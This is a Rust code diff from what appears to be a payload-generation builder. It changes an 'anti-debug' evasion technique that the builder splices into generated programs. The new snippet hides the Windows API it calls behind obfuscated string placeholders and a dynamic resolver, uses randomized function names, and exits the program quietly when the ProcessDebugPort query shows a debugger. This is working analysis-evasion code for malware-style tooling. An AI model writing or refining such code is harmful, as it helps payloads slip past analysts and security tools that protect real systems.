@@ -6,36 +6,33 @@ impl Technique for AntiDebugProcessDebugPort {
     fn meta(&self) -> &'static TechniqueMeta { &ANTI_DEBUG_PROCESS_DEBUG_PORT_META }
 
     fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
-        let snippet = r#"fn evasion_anti_debug_debug_port() {
+        // ProcessDebugPort returns non-zero when a debugger is attached, 0 otherwise.
+        let snippet = r#"fn {{FN_EVASION_DEBUG_PORT}}() {
+    static OBF_MOD: &[u8] = &{{STR_NTDLL}};
+    static OBF_PROC: &[u8] = &{{STR_NTQUERYINFO}};
+    type Fn_ = unsafe extern "system" fn(
+        *mut core::ffi::c_void, u32, *mut isize, u32, *mut u32,
+    ) -> i32;
     unsafe {
-        type NtQueryInfoProc = unsafe extern "system" fn(
-            winapi::shared::ntdef::HANDLE,
-            u32,
-            *mut isize,
-            u32,
-            *mut u32,
-        ) -> i32;
-        let h = winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
-        if h.is_null() { return; }
-        let name = b"NtQueryInformationProcess\0";
-        let p = winapi::um::libloaderapi::GetProcAddress(h, name.as_ptr() as *const i8);
-        if p.is_null() { return; }
-        let f: NtQueryInfoProc = std::mem::transmute(p);
+        let f: Fn_ = match {{FN_RESOLVER}}(OBF_MOD, OBF_PROC) {
+            Some(f) => f,
+            None => return,
+        };
         let mut debug_port: isize = 0;
         let mut ret_len: u32 = 0;
         let status = f(
-            winapi::um::processthreadsapi::GetCurrentProcess(),
+            -1isize as *mut core::ffi::c_void,
             7, // ProcessDebugPort
             &mut debug_port,
             core::mem::size_of::<isize>() as u32,
             &mut ret_len,
         );
-        if status >= 0 && debug_port == -1 {
-            winapi::um::processthreadsapi::ExitProcess(0);
+        if status >= 0 && debug_port != 0 {
+            std::process::exit(0);
         }
     }
 }
-evasion_anti_debug_debug_port();"#;
+{{FN_EVASION_DEBUG_PORT}}();"#;
         ctx.append_replacement("{{SANDBOX}}", snippet.to_string());
         Ok(())
     }
